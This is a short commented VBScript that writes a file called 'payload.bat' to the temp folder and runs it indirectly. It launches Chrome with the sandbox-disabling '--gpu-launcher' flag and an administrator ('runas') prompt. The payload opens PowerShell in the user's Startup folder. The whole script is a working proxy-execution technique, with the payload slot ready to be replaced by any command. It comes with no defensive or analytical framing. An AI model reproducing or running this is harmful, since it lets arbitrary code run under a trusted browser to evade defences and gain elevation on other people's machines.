' Create a FileSystemObject, which allows you to work with files and folders
Set FSO = CreateObject("Scripting.FileSystemObject")

' Create a WScript Shell object, which provides access to various system functions
Set Shell = CreateObject("WScript.Shell")

' Create a Shell Application object, which allows interaction with the Windows shell
Set App = CreateObject("Shell.Application")

' Get the path to the temporary folder (usually C:\Users\<username>\AppData\Local\Temp)
Temp = Shell.ExpandEnvironmentStrings("%temp%") + "\payload.bat"

' Define the content of the payload (in this case, it's a simple batch command)
Payload = "powershell -NoExit -Command ""Set-Location 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"""

' Create a text file in the temporary folder with the specified content
Set File = FSO.CreateTextFile(Temp, True)
File.WriteLine(Payload)

' Use ShellExecute to run a command with specified arguments
' In this case, it executes the Google Chrome executable with specific arguments:
' --disable-gpu-sandbox: Disable GPU sandboxing
' --gpu-launcher: The command to execute (the path to the payload.bat file)
' "runas": Run the command with administrator privileges
App.ShellExecute "C:\Program Files\Google\Chrome\Application\chrome.exe", "--disable-gpu-sandbox --gpu-launcher=" + Temp, , "runas"
